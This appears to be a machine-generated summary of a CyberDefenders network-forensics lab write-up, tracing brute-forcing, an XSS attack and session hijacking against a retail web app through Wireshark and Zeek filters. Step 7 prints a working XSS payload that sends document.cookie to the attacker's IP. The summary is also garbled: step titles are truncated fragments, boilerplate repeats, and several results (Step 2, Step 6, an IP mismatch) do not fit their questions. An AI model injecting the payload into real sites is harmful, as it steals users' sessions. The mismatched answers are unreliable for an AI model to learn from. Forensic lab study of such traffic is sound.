# RetailBreach Lab

## Case Metadata

- Category: `Network Forensics`
- Platform: `CyberDefenders`
- Difficulty: `Easy`
- Source PDF: `https://github.com/tim-barc/ctf_writeups/blob/main/writeups/cyber_defenders_retailbreach_lab.pdf`

## Why This Case Matters

Use this case as a Network Forensics reference for ids, pcap, web-service challenges.

## Input Signals

- Artifacts: ids, pcap, web-service
- Tools: cyberchef, gobuster, virustotal, wireshark
- Techniques: browser-forensics, cti-enrichment, dns-analysis, http-analysis, network-forensics, service-enumeration, timeline-analysis, web-enumeration

## First-Principles Route

- Inventory capture files and identify dominant protocols, endpoints, and conversations.
- Prioritize cleartext protocols, credentials, DNS, HTTP objects, files, and suspicious long sessions.
- Use packet filters or stream following to connect each question to a specific packet, stream, or extracted object.
- When a file is recovered from traffic, pivot into file metadata and strings before deeper analysis.

## Solve Thinking

### Step 1: an effective response. What is the attacker's IP address?

- Route type: `conversation statistics`
- Why: Packet-count questions usually reduce to conversation statistics after endpoint and protocol constraints are fixed.
- Probe: Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
- Tools: cyberchef, virustotal, wireshark
- Reasoning chain:
  - Recognize the goal as conversation statistics.
  - Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.

### Step 2: When approaching network forensics, I like to begin by baselining the traffic, which involves

- Route type: `conversation statistics`
- Why: Packet-count questions usually reduce to conversation statistics after endpoint and protocol constraints are fixed.
- Probe: Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
- Tools: cyberchef, virustotal, wireshark
- Reasoning chain:
  - Recognize the goal as conversation statistics.
  - Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `environment you will see many:`

### Step 3: What immediately stands out is the conversations between 111.224.180.128 and 73.124.17.51

- Route type: `conversation statistics`
- Why: Packet-count questions usually reduce to conversation statistics after endpoint and protocol constraints are fixed.
- Probe: Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
- Tools: cyberchef, virustotal, wireshark
- Reasoning chain:
  - Recognize the goal as conversation statistics.
  - Use cyberchef, virustotal, wireshark to inspect conversation statistics or packet counts for the constrained endpoints and protocol.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `73.124.17.51`

### Step 4: Where both 135.143.142.5 and 73.124.17.51 geolocate to the US. Using the following display

- Route type: `dns pivot`
- Why: DNS questions usually reduce to source host, resolver, queried name, response, or packet number pivots.
- Probe: Use cyberchef, virustotal, wireshark with the extracted filter/query `ip.addr==111.224.180.128 && ip.addr==73.124.17.52` and inspect the matching evidence.
- Tools: cyberchef, virustotal, wireshark
- Filters or commands:
  - `ip.addr==111.224.180.128 && ip.addr==73.124.17.52`
  - `_path=="http" | id.orig_h==111.224.180.128 | count() by status_code`
  - `| sort -r count`
- Reasoning chain:
  - Recognize the goal as dns pivot.
  - Use cyberchef, virustotal, wireshark with the extracted filter/query `ip.addr==111.224.180.128 && ip.addr==73.124.17.52` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `111.224.180.128`

### Step 5: the attacker use to perform the brute-forcing?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, gobuster, virustotal, wireshark with the extracted filter/query `_path=="http" | id.orig_h==111.224.180.128 | count() by user_agent |` and inspect the matching evidence.
- Tools: cyberchef, gobuster, virustotal, wireshark
- Filters or commands:
  - `_path=="http" | id.orig_h==111.224.180.128 | count() by user_agent |`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, gobuster, virustotal, wireshark with the extracted filter/query `_path=="http" | id.orig_h==111.224.180.128 | count() by user_agent |` and inspect the matching evidence.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `Gobuster`

### Step 6: the integrity of the web application?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, virustotal, wireshark with the extracted filter/query `ip.src==111.224.180.128 && ip.addr==73.124.17.52 &&` and inspect the matching evidence.
- Tools: cyberchef, virustotal, wireshark
- Filters or commands:
  - `ip.src==111.224.180.128 && ip.addr==73.124.17.52 &&`
  - `http.request.method==POST`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, virustotal, wireshark with the extracted filter/query `ip.src==111.224.180.128 && ip.addr==73.124.17.52 &&` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `111.224.180.128`

### Step 7: find the form item (I.e., the XSS payload) within the packet details pane:

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, virustotal, wireshark with the extracted filter/query `http.request.uri contains "/reviews.php"` and inspect the matching evidence.
- Tools: cyberchef, virustotal, wireshark
- Filters or commands:
  - `http.request.uri contains "/reviews.php"`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, virustotal, wireshark with the extracted filter/query `http.request.uri contains "/reviews.php"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

### Step 8: used for this unauthorized access?

- Route type: `cyberchef-driven evidence lookup`
- Why: For Network Forensics, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use cyberchef, virustotal, wireshark to collect the smallest evidence slice that answers the goal.
- Tools: cyberchef, virustotal, wireshark
- Reasoning chain:
  - Recognize the goal as cyberchef-driven evidence lookup.
  - Use cyberchef, virustotal, wireshark to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `reviews.php`

### Step 9: identify if it was seen in subsequent requests by the threat actor.

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, virustotal, wireshark with the extracted filter/query `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q"` and inspect the matching evidence.
- Tools: cyberchef, virustotal, wireshark
- Filters or commands:
  - `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q"`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, virustotal, wireshark with the extracted filter/query `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q"` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `lqkctf24s9h9lg67teu8uevn3q`

### Step 10: web application. What is the name of the script that was exploited by the attacker?

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use cyberchef, virustotal, wireshark with the extracted filter/query `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q" &&` and inspect the matching evidence.
- Tools: cyberchef, virustotal, wireshark
- Filters or commands:
  - `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q" &&`
  - `http.request.uri contains "/log_viewer.php"`
- Reasoning chain:
  - Recognize the goal as http evidence extraction.
  - Use cyberchef, virustotal, wireshark with the extracted filter/query `http.cookie_pair=="PHPSESSID=lqkctf24s9h9lg67teu8uevn3q" &&` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `log_viewer.php`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
